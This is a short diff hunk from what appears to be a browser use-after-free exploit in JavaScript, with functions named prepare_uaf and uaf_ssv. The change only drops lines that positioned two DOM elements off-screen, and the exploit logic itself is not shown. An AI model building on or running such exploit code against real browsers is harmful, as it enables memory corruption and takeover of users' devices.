@@ -151,12 +151,8 @@ function prepare_uaf() {
 async function uaf_ssv(fsets, index, save_pop=false) {
     const views = [];
     const input = document.createElement('input');
-    input.style.position = 'absolute';
-    input.style.top = '-100px';
     const foo = document.createElement('a');
     foo.id = 'foo';
-    foo.style.position = 'absolute';
-    foo.style.top = '-100px';
 
     // debug_log(`ssv_len: ${hex(ssv_len)}`);
 
